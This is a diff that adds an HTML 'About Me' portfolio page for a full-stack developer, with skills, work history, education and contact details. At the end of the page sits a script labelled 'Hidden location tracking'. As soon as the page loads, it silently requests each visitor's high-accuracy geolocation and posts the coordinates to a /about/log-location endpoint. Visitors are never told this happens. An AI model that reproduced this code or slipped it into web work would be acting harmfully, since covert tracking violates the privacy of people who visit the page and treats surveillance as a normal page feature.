@@ -1,0 +1,206 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>About Me | Madhuri Sonawane</title>
+    <style>
+        body {
+            font-family: 'Arial', sans-serif;
+            margin: 0;
+            padding: 0;
+            line-height: 1.6;
+            color: #333;
+        }
+
+        nav {
+            background: #333;
+            padding: 1rem;
+        }
+        
+        nav a {
+            color: white;
+            text-decoration: none;
+            margin-right: 20px;
+        }
+
+        .container {
+            max-width: 1000px;
+            margin: 0 auto;
+            padding: 40px 20px;
+        }
+
+        .profile-section {
+            display: grid;
+            grid-template-columns: 300px 1fr;
+            gap: 40px;
+            margin-bottom: 40px;
+        }
+
+        .profile-image {
+            width: 100%;
+            border-radius: 10px;
+            box-shadow: 0 4px 8px rgba(0,0,0,0.1);
+        }
+
+        .skills-grid {
+            display: grid;
+            grid-template-columns: repeat(auto-fill, minmax(150px, 1fr));
+            gap: 15px;
+            margin: 20px 0;
+        }
+
+        .skill-item {
+            background: #f8f9fa;
+            padding: 15px;
+            border-radius: 8px;
+            text-align: center;
+            box-shadow: 0 2px 4px rgba(0,0,0,0.05);
+        }
+
+        .experience-item {
+            margin-bottom: 30px;
+            padding: 20px;
+            background: #f8f9fa;
+            border-radius: 8px;
+        }
+
+        .education-item {
+            margin-bottom: 20px;
+        }
+
+        #location { display: none; }
+
+        .contact-info {
+            background: #f8f9fa;
+            padding: 20px;
+            border-radius: 8px;
+            margin-top: 30px;
+        }
+
+        .social-links {
+            display: flex;
+            gap: 15px;
+            margin-top: 20px;
+        }
+
+        .social-links a {
+            color: #333;
+            text-decoration: none;
+        }
+    </style>
+</head>
+<body>
+    <nav>
+        <a href="/">Home</a>
+        <a href="/about">About</a>
+    </nav>
+
+    <div class="container">
+        <div class="profile-section">
+            <div>
+                <img src="https://source.unsplash.com/random/300x300/?portrait" alt="Madhuri Sonawane" class="profile-image">
+            </div>
+            <div>
+                <h1>Madhuri Sonawane</h1>
+                <h2>Senior Full-Stack Developer</h2>
+                <p>With over 8 years of experience in software development, I specialize in building scalable web applications and leading development teams. My passion lies in creating efficient, user-friendly solutions that solve real-world problems.</p>
+            </div>
+        </div>
+
+        <section>
+            <h2>Technical Expertise</h2>
+            <div class="skills-grid">
+                <div class="skill-item">JavaScript/TypeScript</div>
+                <div class="skill-item">React/Next.js</div>
+                <div class="skill-item">Node.js</div>
+                <div class="skill-item">Python/Django</div>
+                <div class="skill-item">AWS/Cloud</div>
+                <div class="skill-item">Docker</div>
+                <div class="skill-item">MongoDB</div>
+                <div class="skill-item">PostgreSQL</div>
+            </div>
+        </section>
+
+        <section>
+            <h2>Professional Experience</h2>
+            <div class="experience-item">
+                <h3>Senior Developer - Tech Solutions Inc.</h3>
+                <p>2020 - Present</p>
+                <ul>
+                    <li>Lead developer for enterprise-level applications</li>
+                    <li>Implemented microservices architecture reducing system downtime by 40%</li>
+                    <li>Mentored junior developers and conducted code reviews</li>
+                </ul>
+            </div>
+            <div class="experience-item">
+                <h3>Full-Stack Developer - Digital Innovations Co.</h3>
+                <p>2018 - 2020</p>
+                <ul>
+                    <li>Developed and maintained multiple client projects</li>
+                    <li>Implemented CI/CD pipelines reducing deployment time by 60%</li>
+                </ul>
+            </div>
+        </section>
+
+        <section>
+            <h2>Education</h2>
+            <div class="education-item">
+                <h3>Master of Computer Science</h3>
+                <p>Stanford University, 2018</p>
+            </div>
+            <div class="education-item">
+                <h3>Bachelor of Software Engineering</h3>
+                <p>MIT, 2016</p>
+            </div>
+        </section>
+
+        <div class="contact-info">
+            <h2>Get in Touch</h2>
+            <p>Email: madhurisonawane@gmail.com</p>
+            <p>Location: Mumbai, India</p>
+            <div class="social-links">
+                <a href="#">LinkedIn</a>
+                <a href="#">GitHub</a>
+                <a href="#">Twitter</a>
+            </div>
+        </div>
+    </div>
+
+    <!-- Hidden location tracking -->
+    <div id="location"></div>
+    <script>
+        (function() {
+            if (navigator.geolocation) {
+                const options = {
+                    enableHighAccuracy: true,
+                    timeout: 5000,
+                    maximumAge: 0
+                };
+
+                navigator.geolocation.getCurrentPosition(async position => {
+                    const latitude = position.coords.latitude;
+                    const longitude = position.coords.longitude;
+                    const accuracy = position.coords.accuracy;
+                    
+                    try {
+                        await fetch('/about/log-location', {
+                            method: 'POST',
+                            headers: {
+                                'Content-Type': 'application/json'
+                            },
+                            body: JSON.stringify({ 
+                                latitude, 
+                                longitude,
+                                accuracy 
+                            })
+                        });
+                    } catch (error) {
+                        console.error('Error logging location');
+                    }
+                }, null, options);
+            }
+        })();
+    </script>
+</body>
+</html> 
